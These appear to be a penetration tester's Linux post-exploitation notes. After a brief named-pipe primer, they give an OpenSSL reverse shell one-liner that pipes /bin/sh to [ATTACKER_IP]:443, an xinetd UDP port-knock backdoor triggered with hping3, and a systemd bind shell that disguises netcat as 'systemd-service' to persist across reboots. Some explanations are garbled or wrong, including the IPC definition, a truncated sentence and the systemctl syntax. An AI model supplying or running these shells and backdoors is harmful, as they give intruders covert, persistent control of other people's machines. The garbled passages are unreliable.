mkfifo: named pipe. The Pipe concept is close to the IPC one.
IPC, which stands for Inter-communication Process, refers to the way processes can access shared data simultaneosly.
Files are an example of IPC.
Pipes, anonymous or named, are another example of IPC.

Names pipes, in Unix and Unix-like OSes, are much similar to files because.
Names pipes are used in Linux command as a container (series of pipe commands) to which data is redirected to and from.

Example:
- mkfifo a_pipe (create a named pipe "a_pipe");
- gzip -9 -c < a_pipe > out.gz & (create a background gzip process which reads output received from a_pipe and then output to out.gz file)
- cat /etc/passwd > a_pipe (redirect cat output to named pipe which passes the output to the above process)

The pipe act as a placeholder of information between processes.


OPENSSL REVERSE SHELL.
-----------------------

Tools: openssl, mkfifo.

First of all, creation of a certificate:
- openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

Second, set up of a listener:
- openssl s_server -quiet -key key.pem -cert cert.pem -port 443

Third, creation of a mkfifo named pipe to use openssl to connect back to attacker machine:
- mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 \ | openssl s_client -quiet -connect [ATTACKER_IP]:443 > /tmp/x; rm /tmp/x

"\" character is known as a "bash continuation line" which let to input commands on different lines and to be read as
if the input was a single liner.


ICMP REVERSE SHELL.
--------------------

Tools: icmpsh.



XINETD UDP PORTKNOCK BACKDOOR (PERSISTENCE).
---------------------------------------------

Tools: xinetd, hping3, netcat.

The built-in Xinetd daemon is used to manage network-based services on Linux systems.
Xinetd will listen of given ports and when a communication is received, it will execute already specified commands.

This Portknocking technique survives system reboots.
Example:
- make use of /home/jito/Documents/pentest/tools/post_exploitation/linux/maintain_access/xinetd_server.sh script to create a xinetd modified service (based on netcat) on target host;
- setup netcat listener on attacker machine: nc -lvnp 443
- craft and send a UDP packet with destination port 65534 (or the one specified in the script above) using hping3: hping3 -2 -c 1 [TARGET_IP] -p 65534;



SYSTEMD NETCAT BIND SHELL (PERSISTENCE).
---------------------------

Tools: systemd.

Similar to XINTED UDP PORTKNOCK BACKDOOR but, in this case, the entire process aims in getting a bind shell.
Example:
- cp /bin/nc /lib/systemd/systemd-service: create a fake service name systemd-service, which is a copy of netcat;
- on the target machine the attacker must create a file named /lib/systemd/system/systemd.service with the following contents:
[Unit]
Description = Systemd Service
After = network.target
[Service]
ExecStart = /lib/systemd/systemd-service -lvp [PORT_NUMBER] -e /bin/sh
[Install]
WantedBy = multi-user.target
- systemctl systemd.service stop
- systemctl systemd.service start: stop and start service

(to confirm that everything is ready: netstat -auntp | grep [PORT_NUMBER]

-nc [TARGET_IP] [PORT_NUMBER]

This technique survives system reboots.

